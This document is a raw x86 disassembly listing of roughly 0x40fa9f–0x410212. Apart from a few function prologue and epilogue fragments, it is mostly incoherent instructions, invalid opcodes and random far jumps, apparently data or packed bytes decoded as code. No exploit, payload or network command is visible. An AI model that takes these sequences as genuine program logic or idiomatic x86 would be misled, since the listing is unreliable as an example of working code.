  40fa9f:	call   0x88c71b74
  40faa4:	iret   
  40faa5:	loopne 0x40fa91
  40faa7:	xor    edx,DWORD PTR [ecx-0x28]
  40faaa:	sbb    DWORD PTR [eax-0x65],ebx
  40faad:	and    bl,0x10
  40fab0:	pushf  
  40fab1:	in     eax,dx
  40fab2:	iret   
  40fab3:	jo     0x40fa5a
  40fab5:	and    DWORD PTR [edi-0x5e8a53c8],edx
  40fabb:	mov    ah,0x66
  40fabd:	push   ss
  40fabe:	int3   
  40fabf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fac0:	push   es
  40fac1:	push   esi
  40fac2:	call   0xc306:0x2a30a0d7
  40fac9:	push   ebx
  40faca:	jmp    0xb87aa92f
  40facf:	jge    0x40faef
  40fad1:	xchg   esi,eax
  40fad2:	jns    0x40fb0a
  40fad4:	mul    BYTE PTR [esi-0x20bf313b]
  40fada:	sbb    esi,ebp
  40fadc:	xor    BYTE PTR [eax+edi*1+0x1129fe50],bh
  40fae3:	cmc    
  40fae4:	sbb    eax,0xb2437cf7
  40fae9:	cmp    ebx,ebp
  40faeb:	imul   ecx,edi,0xffffffc4
  40faee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faef:	mov    edi,0xa0a6d6d0
  40faf4:	mov    bh,0xb6
  40faf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faf7:	mov    bh,0x2d
  40faf9:	stos   BYTE PTR es:[edi],al
  40fafa:	(bad)  
  40fafb:	lock cmp eax,0x24b6d913
  40fb01:	xchg   esi,eax
  40fb02:	fiadd  DWORD PTR [edx+edi*2+0x5f84d016]
  40fb09:	jae    0x40fadb
  40fb0b:	xor    bl,BYTE PTR [edx-0x7c]
  40fb0e:	repnz gs out dx,al
  40fb11:	xchg   ebp,eax
  40fb12:	imul   esp,DWORD PTR [eax+0x6e],0x19250106
  40fb19:	fisttp DWORD PTR ds:0x1779ea4b
  40fb1f:	std    
  40fb20:	push   ss
  40fb21:	cmp    eax,0xea4d3e0f
  40fb26:	in     eax,0x42
  40fb28:	fdivr  DWORD PTR [edx]
  40fb2a:	pusha  
  40fb2b:	ins    BYTE PTR es:[edi],dx
  40fb2c:	add    al,BYTE PTR [esi-0x4e953cd0]
  40fb32:	mov    WORD PTR [ecx],ds
  40fb34:	scas   eax,DWORD PTR es:[edi]
  40fb35:	mov    al,ds:0x76f193d9
  40fb3a:	aas    
  40fb3b:	gs into 
  40fb3d:	int3   
  40fb3e:	mov    esi,0xd8358083
  40fb43:	test   BYTE PTR [edi],bl
  40fb45:	fcom   QWORD PTR [edi-0x75]
  40fb48:	jp     0x40fbc8
  40fb4a:	adc    DWORD PTR [ecx-0x7fe42b41],0xa8768df6
  40fb54:	mov    ebp,0xa8328774
  40fb59:	pop    ebx
  40fb5a:	inc    esp
  40fb5b:	and    ah,ah
  40fb5d:	cld    
  40fb5e:	popa   
  40fb5f:	sub    al,0xba
  40fb61:	scas   eax,DWORD PTR es:[edi]
  40fb62:	cmp    ecx,ebx
  40fb64:	or     eax,0x9e95c2b2
  40fb69:	out    dx,eax
  40fb6a:	fidivr DWORD PTR [esp+esi*4]
  40fb6d:	ja     0x40fbb3
  40fb6f:	adc    eax,0xeebaec6b
  40fb74:	jno    0x40fbdc
  40fb76:	and    bl,ah
  40fb78:	aam    0xd0
  40fb7a:	lods   eax,DWORD PTR ds:[esi]
  40fb7b:	sti    
  40fb7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb7d:	cmp    DWORD PTR [eax+0x65],ebx
  40fb80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb81:	pop    ss
  40fb82:	outs   dx,DWORD PTR ds:[esi]
  40fb83:	cmp    DWORD PTR [edx+0x4365248e],0xbbfc2a1a
  40fb8d:	rcr    BYTE PTR [edx],cl
  40fb8f:	inc    esp
  40fb90:	xchg   ecx,eax
  40fb91:	nop
  40fb92:	popf   
  40fb93:	jae    0x40fb33
  40fb95:	test   al,0xf0
  40fb97:	mov    edi,0xae9fb886
  40fb9c:	push   esi
  40fb9d:	ins    DWORD PTR es:[edi],dx
  40fb9e:	aas    
  40fb9f:	jnp    0x40fbff
  40fba1:	inc    ebx
  40fba2:	jbe    0x40f521
  40fba8:	pop    ebx
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x2d
  40fbc9:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40fbcb:	xor    eax,edx
  40fbcd:	mov    dh,0x7e
  40fbcf:	jle    0x40fc4d
  40fbd1:	jge    0x40fc51
  40fbd3:	jle    0x40fbcd
  40fbd5:	mov    cl,BYTE PTR [ecx-0x48]
  40fbd8:	pop    edx
  40fbd9:	push   ds
  40fbda:	lahf   
  40fbdb:	lods   eax,DWORD PTR ds:[esi]
  40fbdc:	sub    eax,0xb9909ccd
  40fbe1:	jno    0x40fbb4
  40fbe3:	cli    
  40fbe4:	leave  
  40fbe5:	mov    dh,0xe1
  40fbe7:	xor    ah,BYTE PTR [ebx-0x7d]
  40fbea:	arpl   si,cx
  40fbec:	stc    
  40fbed:	or     ch,BYTE PTR [ecx-0x58]
  40fbf0:	ror    al,1
  40fbf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbf3:	cdq    
  40fbf4:	mov    WORD PTR [edx+0x5ccf28a4],ss
  40fbfa:	das    
  40fbfb:	pusha  
  40fbfc:	add    eax,0xfb62f665
  40fc01:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc03:	push   0x25
  40fc05:	mov    edx,0xc1b67976
  40fc0a:	nop    DWORD PTR [esi]
  40fc0d:	cmp    esp,DWORD PTR [esi]
  40fc0f:	inc    ecx
  40fc10:	mov    dl,0xfe
  40fc12:	mov    ebx,0xc696313b
  40fc17:	icebp  
  40fc18:	ds das 
  40fc1a:	sub    ebp,esi
  40fc1c:	add    cl,BYTE PTR [eax]
  40fc1e:	rcr    DWORD PTR [eax+0xf12d799],cl
  40fc24:	mov    dl,0xae
  40fc26:	inc    ebp
  40fc27:	push   ds
  40fc28:	(bad)  
  40fc29:	int3   
  40fc2a:	dec    di
  40fc2c:	mov    ds,WORD PTR [ebp-0xa559d87]
  40fc32:	and    DWORD PTR [ecx+0xd02214f],edi
  40fc38:	push   esi
  40fc39:	mov    esi,0xaa76f5a8
  40fc3e:	push   0xc271d572
  40fc43:	sub    esi,edi
  40fc45:	push   es
  40fc46:	ror    BYTE PTR [edi+0x41cf0a4a],0x7b
  40fc4d:	retf   
  40fc4e:	jae    0x40fc9e
  40fc50:	sbb    eax,0x79ac18b6
  40fc55:	retf   0xf8ec
  40fc58:	inc    ebx
  40fc59:	add    al,0x1a
  40fc5b:	inc    esi
  40fc5c:	imul   edx,edi,0x63
  40fc5f:	jle    0x40fc36
  40fc61:	mov    al,BYTE PTR [ebx]
  40fc63:	mov    cl,0xbe
  40fc65:	jg     0x40fc51
  40fc67:	(bad)  
  40fc68:	ins    BYTE PTR es:[edi],dx
  40fc69:	inc    edx
  40fc6a:	jbe    0x40fc9c
  40fc6c:	pusha  
  40fc6d:	aad    0xb3
  40fc6f:	in     al,0x9d
  40fc71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc72:	jmp    0x40fbf4
  40fc74:	je     0x40fc6b
  40fc76:	fidiv  WORD PTR [esi-0x66]
  40fc79:	inc    eax
  40fc7a:	cmp    al,0xa0
  40fc7c:	mov    esp,0x13a7d4ab
  40fc81:	fs xchg esi,eax
  40fc83:	outs   dx,DWORD PTR ds:[esi]
  40fc84:	mov    edi,ebx
  40fc86:	mov    ds:0xf22ea401,eax
  40fc8b:	pop    eax
  40fc8c:	jle    0x40fce6
  40fc8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc8f:	push   ecx
  40fc90:	out    0x2e,eax
  40fc92:	ins    BYTE PTR es:[edi],dx
  40fc93:	push   eax
  40fc94:	inc    ebx
  40fc95:	jl     0x40fc46
  40fc97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc98:	scas   al,BYTE PTR es:[edi]
  40fc99:	jle    0x40fc8f
  40fc9b:	cld    
  40fc9c:	shl    BYTE PTR [ecx+0x22],1
  40fc9f:	push   edx
  40fca0:	test   BYTE PTR [esi+ebx*2-0x74],al
  40fca4:	push   esi
  40fca5:	xchg   ecx,eax
  40fca6:	add    bl,bl
  40fca8:	inc    esi
  40fca9:	sub    eax,0xd3ba1197
  40fcae:	popa   
  40fcaf:	jb     0x40fcd0
  40fcb1:	adc    esp,DWORD PTR [eax-0x78]
  40fcb4:	cmp    edx,eax
  40fcb6:	fcmove st,st(3)
  40fcb8:	mov    cl,0xa2
  40fcba:	xchg   DWORD PTR [esi+0x59],edi
  40fcbd:	ja     0x40fc56
  40fcbf:	push   es
  40fcc0:	dec    esp
  40fcc1:	out    dx,al
  40fcc2:	stos   BYTE PTR es:[edi],al
  40fcc3:	jns    0x40fcb8
  40fcc5:	and    al,0x55
  40fcc7:	test   al,0x5d
  40fcc9:	xchg   esp,eax
  40fcca:	(bad)  [edi]
  40fccc:	lods   eax,DWORD PTR ds:[esi]
  40fccd:	fs jno 0x40fcb9
  40fcd0:	jns    0x40fd50
  40fcd2:	jp     0x40fcb5
  40fcd4:	sub    ch,cl
  40fcd6:	cmp    al,0xf1
  40fcd8:	es xchg edx,eax
  40fcda:	not    DWORD PTR [ecx]
  40fcdc:	ins    BYTE PTR es:[edi],dx
  40fcdd:	pop    ss
  40fcde:	jl     0x40fc71
  40fce0:	xchg   esi,eax
  40fce1:	mov    ah,BYTE PTR [ebp-0x12]
  40fce4:	add    edx,DWORD PTR fs:[ecx]
  40fce7:	loopne 0x40fd1a
  40fce9:	cs inc eax
  40fceb:	in     al,dx
  40fcec:	(bad)  [ebx+edx*8-0x9]
  40fcf0:	test   BYTE PTR ds:0xb7077ce1,0xcd
  40fcf7:	pop    edi
  40fcf8:	push   ecx
  40fcf9:	stos   BYTE PTR es:[edi],al
  40fcfa:	(bad)  
  40fcfb:	aam    0xfe
  40fcfd:	mov    WORD PTR [ebx-0x11],gs
  40fd00:	adc    eax,0x6d43825a
  40fd05:	cwde   
  40fd06:	js     0x40fcf7
  40fd08:	xor    BYTE PTR [eax+0x6da4cbbb],ch
  40fd0e:	cmc    
  40fd0f:	popa   
  40fd10:	sub    dh,BYTE PTR [ebx+0x74ba5c3d]
  40fd16:	into   
  40fd17:	aam    0x8c
  40fd19:	cvtps2pd xmm5,xmm2
  40fd1c:	stos   DWORD PTR es:[edi],eax
  40fd1d:	mov    dh,0x50
  40fd1f:	xchg   ebp,eax
  40fd20:	xchg   edx,eax
  40fd21:	jmp    0x40fd30
  40fd23:	add    dh,BYTE PTR [ebp-0x45f8609f]
  40fd29:	jbe    0x40fda3
  40fd2b:	addr16 mov dh,0x46
  40fd2e:	jge    0x40fcd6
  40fd30:	aaa    
  40fd31:	adc    edi,DWORD PTR [ebx-0x73]
  40fd34:	fisubr WORD PTR [edi+0x6f]
  40fd37:	pushf  
  40fd38:	dec    ebp
  40fd39:	sub    BYTE PTR [edi+0x47c3df9c],0x4d
  40fd40:	ja     0x40fd56
  40fd42:	jmp    0xd807:0xccaa5732
  40fd49:	outs   dx,DWORD PTR ds:[esi]
  40fd4a:	pop    ds
  40fd4b:	mov    esp,0xf9112542
  40fd50:	cld    
  40fd51:	jne    0x40fce2
  40fd53:	push   cs
  40fd54:	mov    ch,0xd7
  40fd56:	cmp    al,0xaa
  40fd58:	pushf  
  40fd59:	sub    ah,BYTE PTR [edx-0x6f]
  40fd5c:	lock lock cmp eax,0xb6b08ff6
  40fd63:	addr16 pop edi
  40fd65:	xor    DWORD PTR [eax-0x5e],edx
  40fd68:	icebp  
  40fd69:	aam    0xfe
  40fd6b:	mov    edi,0xe41a4155
  40fd70:	(bad)  
  40fd71:	in     al,0xba
  40fd73:	test   dl,dl
  40fd75:	test   DWORD PTR [edi+0x13723907],0xbd83ab32
  40fd7f:	inc    edx
  40fd80:	sbb    al,0x5d
  40fd82:	cmp    ecx,DWORD PTR [ebx-0x5a3ec31e]
  40fd88:	dec    esp
  40fd89:	jl     0x40fd76
  40fd8b:	xchg   edi,eax
  40fd8c:	ret    
  40fd8d:	ror    dl,1
  40fd8f:	sets   BYTE PTR [ebx-0x33d3ad83]
  40fd96:	jne    0x40fd87
  40fd98:	jnp    0x40fe04
  40fd9a:	push   ebx
  40fd9b:	mov    eax,0x83a9b409
  40fda0:	mov    eax,ds:0x792c2253
  40fda5:	mov    cl,0x3e
  40fda7:	(bad)  
  40fda8:	fst    st(0)
  40fdaa:	jmp    0x40fdb3
  40fdac:	out    0xc7,eax
  40fdae:	popf   
  40fdaf:	sti    
  40fdb0:	xchg   BYTE PTR [ebx+0x10],cl
  40fdb3:	imul   eax,DWORD PTR [ebx],0xf88a8cbb
  40fdb9:	cmp    dh,BYTE PTR [ecx+0xbba2e5f]
  40fdbf:	outs   dx,BYTE PTR ds:[esi]
  40fdc0:	cmp    eax,0x842b870d
  40fdc5:	fidivr DWORD PTR ds:0x5c2ecf2e
  40fdcb:	sbb    eax,0xd1c8f322
  40fdd0:	test   al,0xe3
  40fdd2:	cdq    
  40fdd3:	(bad)  
  40fdd5:	mov    ch,0x95
  40fdd7:	mov    edx,0x4bcb7a8d
  40fddc:	mov    ?,WORD PTR [ecx+0x176939ce]
  40fde2:	push   ds
  40fde3:	pop    edi
  40fde4:	sbb    BYTE PTR [esi-0x34],ch
  40fde7:	xor    BYTE PTR [edx],bl
  40fde9:	inc    edi
  40fdea:	mov    BYTE PTR [edx-0x1f],0xea
  40fdee:	shr    DWORD PTR [ebx],1
  40fdf0:	mov    esp,0xa8c527a4
  40fdf5:	inc    edx
  40fdf6:	(bad)  
  40fdf7:	imul   ecx,ecx,0x450c6bfe
  40fdfd:	outs   dx,BYTE PTR ds:[esi]
  40fdfe:	cmp    esp,edi
  40fe00:	push   edi
  40fe01:	aas    
  40fe02:	push   ebp
  40fe03:	cdq    
  40fe04:	xor    BYTE PTR [ebp+0x500248c0],dl
  40fe0a:	sti    
  40fe0b:	js     0x40fdb5
  40fe0d:	cmp    ecx,ebx
  40fe0f:	cld    
  40fe10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe11:	and    BYTE PTR [edi],0x43
  40fe14:	inc    edi
  40fe15:	and    bl,ch
  40fe17:	jmp    0x25b0833d
  40fe1c:	xlat   BYTE PTR ds:[ebx]
  40fe1d:	adc    al,0xcb
  40fe1f:	sub    BYTE PTR [ebx],dl
  40fe21:	aam    0xfd
  40fe23:	pop    esi
  40fe24:	xor    eax,0x4a469c3b
  40fe29:	or     eax,DWORD PTR [edi+edx*2]
  40fe2c:	fadd   QWORD PTR [ebx-0x69]
  40fe2f:	push   0x7f
  40fe31:	sub    ah,ch
  40fe33:	add    edi,DWORD PTR [esi-0x537a6083]
  40fe39:	jmp    0xbd4b:0x5fb4c79b
  40fe40:	mul    DWORD PTR [eax+0x1612001]
  40fe46:	adc    cl,BYTE PTR [ecx+0x2d]
  40fe49:	cmp    al,0x0
  40fe4b:	repnz dec eax
  40fe4d:	and    BYTE PTR [esi],bh
  40fe4f:	add    DWORD PTR [edi-0x6a92acf0],ebx
  40fe55:	inc    eax
  40fe56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe57:	mov    ah,0xa0
  40fe59:	jnp    0x40fea1
  40fe5b:	mov    ebx,0x13d8f06e
  40fe60:	out    dx,al
  40fe61:	add    ecx,edx
  40fe63:	push   ss
  40fe64:	push   edx
  40fe65:	sbb    DWORD PTR [eax+0x19],esp
  40fe68:	outs   dx,DWORD PTR ds:[esi]
  40fe69:	dec    eax
  40fe6a:	pop    esi
  40fe6b:	out    0x63,al
  40fe6d:	jb     0x40fe60
  40fe6f:	aam    0x99
  40fe71:	xchg   ebp,eax
  40fe72:	int3   
  40fe73:	scas   eax,DWORD PTR es:[edi]
  40fe74:	and    ecx,esp
  40fe76:	inc    ebx
  40fe77:	mov    eax,esi
  40fe79:	cmp    al,0x95
  40fe7b:	aam    0x27
  40fe7d:	jb     0x40fef5
  40fe7f:	xchg   ebx,eax
  40fe80:	pop    ss
  40fe81:	cmp    eax,0x52b5b287
  40fe86:	mov    dl,BYTE PTR [ecx-0x498b2525]
  40fe8c:	mov    ebp,0x19bcf6fe
  40fe91:	bound  ecx,QWORD PTR [ebx+0x4a]
  40fe94:	pushf  
  40fe95:	add    al,0x5b
  40fe97:	mov    al,0x35
  40fe99:	xchg   esp,eax
  40fe9a:	je     0x40fe88
  40fe9c:	add    esi,DWORD PTR [edi-0x444f4d80]
  40fea2:	jg     0x40fe4f
  40fea4:	dec    edx
  40fea5:	push   ebp
  40fea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fea7:	fbld   TBYTE PTR [edi]
  40fea9:	push   esi
  40feaa:	pop    es
  40feab:	(bad)  
  40feac:	rol    cl,cl
  40feae:	loope  0x40fee3
  40feb0:	neg    cl
  40feb2:	mov    al,0x7e
  40feb4:	jns    0x40fe7b
  40feb6:	out    0xc9,al
  40feb8:	or     ebx,DWORD PTR [edi+0x34]
  40febb:	and    BYTE PTR [ecx-0x24],al
  40febe:	inc    esi
  40febf:	lock call DWORD PTR [ebp-0x3954a5c6]
  40fec6:	das    
  40fec7:	daa    
  40fec8:	lock lods al,BYTE PTR ds:[esi]
  40feca:	scas   al,BYTE PTR es:[edi]
  40fecb:	xor    al,0x2e
  40fecd:	hlt    
  40fece:	adc    al,0x76
  40fed0:	xchg   ecx,eax
  40fed1:	sub    al,0x92
  40fed3:	fld    QWORD PTR [eax+0xc458b8a]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x8f694346
  40fef3:	push   ss
  40fef4:	pop    edx
  40fef5:	fidiv  WORD PTR [ebp+0x7d7c7e7e]
  40fefb:	jle    0x40ff7b
  40fefd:	fabs   
  40feff:	cmp    BYTE PTR [ebx+eax*4-0x7f],0xd8
  40ff04:	lds    edi,FWORD PTR [ebx]
  40ff06:	xor    eax,0x64f6030b
  40ff0b:	sub    BYTE PTR [ecx-0x644455d5],ch
  40ff11:	lea    esp,[esi]
  40ff13:	cwde   
  40ff14:	aad    0x16
  40ff16:	outs   dx,BYTE PTR ds:[esi]
  40ff17:	xchg   DWORD PTR [edi-0x33],esi
  40ff1a:	push   es
  40ff1b:	mov    bl,0x76
  40ff1d:	in     al,0x59
  40ff1f:	ror    BYTE PTR [esi+ebx*8-0xb1cf908],cl
  40ff26:	dec    esi
  40ff27:	int    0x16
  40ff29:	sbb    eax,0x7510eff5
  40ff2e:	fnsave [ecx+eax*8-0x52eb0f06]
  40ff35:	inc    eax
  40ff36:	jne    0x40febf
  40ff38:	dec    BYTE PTR [edi+eax*1+0x51]
  40ff3c:	xchg   ebp,eax
  40ff3d:	inc    esi
  40ff3e:	jl     0x40ff1b
  40ff40:	hlt    
  40ff41:	mov    ds:0x8eef247,eax
  40ff46:	sbb    eax,0x9185bd94
  40ff4b:	aaa    
  40ff4c:	push   edi
  40ff4d:	scas   al,BYTE PTR es:[edi]
  40ff4e:	fs call 0x2da85103
  40ff54:	add    ah,ch
  40ff56:	mov    eax,ds:0x9dbf222c
  40ff5b:	(bad)  
  40ff5c:	jle    0x40ff99
  40ff5e:	sbb    ecx,DWORD PTR [ebx-0x42466b06]
  40ff64:	addr16 fwait
  40ff66:	push   ebp
  40ff67:	dec    edx
  40ff69:	add    ecx,esp
  40ff6b:	mov    al,0xac
  40ff6d:	xor    edi,DWORD PTR [ebp-0x761c1b6d]
  40ff73:	lock sbb al,0x38
  40ff76:	aam    0x66
  40ff78:	out    0xe9,al
  40ff7a:	or     BYTE PTR [edi+0x68eaf4c8],0x73
  40ff81:	es retf 
  40ff83:	inc    esp
  40ff84:	dec    ebx
  40ff85:	mov    gs,ebp
  40ff87:	addr16 push ecx
  40ff89:	inc    esp
  40ff8a:	mov    eax,ds:0x2c230f45
  40ff8f:	mov    ch,0x19
  40ff91:	pusha  
  40ff92:	lods   al,BYTE PTR ds:[esi]
  40ff93:	xchg   edx,eax
  40ff94:	jns    0x40ff91
  40ff96:	adc    cl,dl
  40ff98:	inc    ecx
  40ff99:	scas   eax,DWORD PTR es:[edi]
  40ff9a:	jb     0x40ffd4
  40ff9c:	jnp    0x40ffbd
  40ff9e:	inc    ebx
  40ff9f:	es push cs
  40ffa1:	stos   BYTE PTR es:[edi],al
  40ffa2:	dec    esi
  40ffa3:	xrelease xchg BYTE PTR [ebx-0x7673a9b7],dl
  40ffaa:	or     BYTE PTR [edx+0x6245159a],ah
  40ffb0:	xchg   esp,eax
  40ffb1:	xlat   BYTE PTR ds:[ebx]
  40ffb2:	clc    
  40ffb3:	test   ebp,edx
  40ffb5:	and    DWORD PTR ss:[edi-0x378a1b6d],ecx
  40ffbc:	shr    BYTE PTR [edx],0x96
  40ffbf:	mov    bl,0x6e
  40ffc1:	jp     0x41000d
  40ffc3:	cs sti 
  40ffc5:	jmp    0x40ffc4
  40ffc7:	pop    edi
  40ffc8:	retf   0x6b1d
  40ffcb:	rcr    BYTE PTR [eax+0x7a7f7cbb],cl
  40ffd1:	mov    esp,0x24eb4b3a
  40ffd6:	in     al,dx
  40ffd7:	inc    ebp
  40ffd8:	jle    0x410019
  40ffda:	xchg   esi,eax
  40ffdb:	scas   eax,DWORD PTR es:[edi]
  40ffdc:	in     eax,0x9
  40ffde:	xchg   esp,eax
  40ffdf:	sbb    eax,0xbca1ce53
  40ffe4:	test   DWORD PTR [edi-0x3387282b],eax
  40ffea:	lods   al,BYTE PTR ds:[esi]
  40ffeb:	xchg   esp,eax
  40ffec:	mov    dh,0xe9
  40ffee:	stos   BYTE PTR es:[edi],al
  40ffef:	dec    ebp
  40fff0:	push   0xffffffba
  40fff2:	das    
  40fff3:	sahf   
  40fff4:	lock mov bh,0x9b
  40fff7:	call   0x704a6bf7
  40fffc:	pop    ecx
  40fffd:	inc    cl
  40ffff:	mov    ch,0x93
  410001:	mov    esp,0x3c5358e0
  410006:	and    DWORD PTR [edx],esi
  410008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410009:	int3   
  41000a:	sbb    al,0x41
  41000c:	dec    ebx
  41000d:	push   esp
  41000e:	xor    eax,0x4600670
  410013:	call   0xe905:0xfa8a378f
  41001a:	inc    eax
  41001b:	into   
  41001c:	mov    dh,0x8f
  41001e:	jmp    0x22155a10
  410023:	or     DWORD PTR [ebx],ebp
  410025:	jg     0x40ffb3
  410027:	div    DWORD PTR ds:0x72312330
  41002d:	cmc    
  41002e:	push   ebp
  41002f:	shl    ecx,0x8e
  410032:	ret    
  410033:	mov    WORD PTR [ebx+0x2136a5cb],ss
  410039:	inc    ebx
  41003a:	leave  
  41003b:	lea    ebx,[esi+0x37655904]
  410041:	div    DWORD PTR [ecx+0x20f88a9d]
  410047:	mov    dl,0xb1
  410049:	adc    al,0xdf
  41004b:	jl     0x40ffe7
  41004d:	xor    BYTE PTR [ecx-0x7e855f48],0x69
  410054:	neg    ebp
  410056:	xor    DWORD PTR [edi-0x45],esi
  410059:	mov    eax,ds:0xdcf78ce3
  41005e:	outs   dx,BYTE PTR ds:[esi]
  41005f:	ret    0xb509
  410062:	jmp    FWORD PTR [edx+0x46]
  410065:	mov    esi,0xdb4dd0b8
  41006a:	ins    DWORD PTR es:[edi],dx
  41006b:	out    0x16,eax
  41006d:	call   0x7de37d66
  410072:	je     0x410011
  410074:	cmp    cl,BYTE PTR [edi]
  410076:	xchg   edx,eax
  410077:	pop    es
  410078:	(bad)  
  410079:	stc    
  41007a:	xchg   BYTE PTR [ebp+eiz*2-0x2e83f4bf],bh
  410081:	dec    eax
  410082:	out    dx,eax
  410083:	add    BYTE PTR [edi],dh
  410085:	mov    dh,0xd4
  410087:	inc    ecx
  410088:	psubw  mm2,QWORD PTR [ebx+eax*4-0x16]
  41008d:	mov    ebx,0xb5fcfb9
  410092:	cmp    ch,dh
  410094:	adc    dl,BYTE PTR [eax-0x62]
  410097:	jae    0x410060
  410099:	dec    edx
  41009a:	(bad)  
  41009b:	jns    0x4100c4
  41009d:	pop    edx
  41009e:	add    al,0x36
  4100a0:	ss test edx,edi
  4100a3:	jp     0x4100fc
  4100a5:	fld    TBYTE PTR [edi+0xe]
  4100a8:	fwait
  4100a9:	leave  
  4100aa:	frstor [eax+0x7d]
  4100ad:	das    
  4100ae:	sub    DWORD PTR [ecx+0xac0781],eax
  4100b4:	sub    dl,BYTE PTR [eax]
  4100b6:	js     0x4100f3
  4100b8:	add    bh,BYTE PTR [ecx+0x185f86f5]
  4100be:	(bad)  
  4100bf:	out    dx,eax
  4100c0:	xor    DWORD PTR [edi-0x6a553061],0x58
  4100c7:	xor    al,BYTE PTR [ebx-0x7861ba84]
  4100cd:	xor    esp,DWORD PTR [esi]
  4100cf:	jl     0x410139
  4100d1:	(bad)  
  4100d2:	sbb    esi,DWORD PTR [ebx-0x7f]
  4100d5:	ja     0x410126
  4100d7:	pop    ss
  4100d8:	cs jns 0x410099
  4100db:	or     BYTE PTR [ecx-0x78e655fd],ch
  4100e1:	in     al,dx
  4100e2:	or     cl,bl
  4100e4:	aaa    
  4100e5:	inc    ecx
  4100e6:	nop
  4100e7:	je     0x410069
  4100e9:	cmp    esp,DWORD PTR [ecx]
  4100eb:	fwait
  4100ec:	jg     0x410115
  4100ee:	jo     0x4100fe
  4100f0:	sub    DWORD PTR [edx-0x663279e1],ecx
  4100f6:	pop    esi
  4100f7:	je     0x4100e9
  4100f9:	adc    BYTE PTR [eax],cl
  4100fb:	mov    ebp,0xa620ff9c
  410100:	ror    DWORD PTR [eax-0x510c5de6],cl
  410106:	fsub   QWORD PTR [bx]
  410109:	add    ecx,DWORD PTR [ebx]
  41010b:	mov    WORD PTR [esi+edi*8+0x6a83c942],ss
  410112:	fs adc ebp,edi
  410115:	jne    0x4100e1
  410117:	dec    eax
  410118:	nop
  410119:	jge    0x4100b4
  41011b:	div    BYTE PTR [esi-0x3e825c29]
  410121:	push   0x70b34d60
  410126:	fild   DWORD PTR [ebp+0x4c]
  410129:	daa    
  41012a:	(bad)  [ebp-0x2cd04259]
  410130:	mov    ebp,0xed2cf7fb
  410135:	imul   edx,DWORD PTR [edi],0xe32e3726
  41013b:	adc    BYTE PTR [eax],0x94
  41013e:	push   es
  41013f:	fstp   TBYTE PTR [esi]
  410141:	out    dx,al
  410142:	sbb    al,0x63
  410144:	mov    esi,0xb0e9c05a
  410149:	popa   
  41014a:	fadd   QWORD PTR [esp+eax*2]
  41014d:	inc    ebp
  41014e:	cmp    DWORD PTR [edx+0x24e5db44],eax
  410154:	test   al,0x98
  410156:	rcr    BYTE PTR [esi+0x1c],0x9f
  41015a:	xchg   esp,eax
  41015b:	adc    eax,0xf1c0fc19
  410160:	fdivr  DWORD PTR [ebx-0x56]
  410163:	or     DWORD PTR [esi+0x415bb1dc],0x3cf0e90c
  41016d:	gs mov dl,0xc7
  410170:	mov    ebp,0x283dd3e0
  410175:	add    ecx,DWORD PTR [ebp-0x31]
  410178:	xor    ecx,DWORD PTR [ecx+ebp*2-0xc]
  41017c:	pop    eax
  41017d:	sbb    eax,0x3216f0f5
  410182:	addr16 inc ebx
  410184:	es lahf 
  410186:	and    eax,0x1e5b9243
  41018b:	pop    ds
  41018c:	fisubr DWORD PTR [ebp+0x31339e68]
  410192:	jb     0x4101fc
  410194:	mov    ?,WORD PTR [edx+esi*1-0x78d46f5f]
  41019b:	das    
  41019c:	repnz (bad) ss:[ebx+0xbeaf647]
  4101a4:	xchg   esi,eax
  4101a5:	(bad)  
  4101a6:	out    dx,al
  4101a7:	jl     0x41012c
  4101a9:	enter  0x7b97,0x9d
  4101ad:	push   esi
  4101ae:	pop    ecx
  4101af:	shr    ebp,0x3e
  4101b2:	fmulp  st(4),st
  4101b4:	dec    edx
  4101b5:	iret   
  4101b6:	mov    dh,BYTE PTR [ebx]
  4101b8:	fs das 
  4101ba:	mov    bh,0xdb
  4101bc:	jo     0x410153
  4101be:	jmp    0x9608:0xb645271e
  4101c5:	mov    eax,ds:0xa6953b88
  4101ca:	push   esp
  4101cb:	out    dx,al
  4101cc:	jbe    0x4101c6
  4101ce:	cmp    eax,0x1b30c3d5
  4101d3:	jns    0x4101f6
  4101d5:	int3   
  4101d6:	adc    ah,cl
  4101d8:	or     ah,BYTE PTR [ecx+0x6e]
  4101db:	ja     0x41018a
  4101dd:	inc    eax
  4101de:	xor    edi,DWORD PTR [ecx+0x3]
  4101e1:	clc    
  4101e2:	jmp    0x134b:0x7254f2cf
  4101e9:	and    al,0x5
  4101eb:	mov    eax,0x7c210bc8
  4101f0:	div    edx
  4101f2:	call   0xf852854
  4101f7:	pop    ecx
  4101f8:	xor    edi,DWORD PTR [ecx-0x6b]
  4101fb:	fcmovne st,st(6)
  4101fd:	inc    edi
  4101fe:	push   edx
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
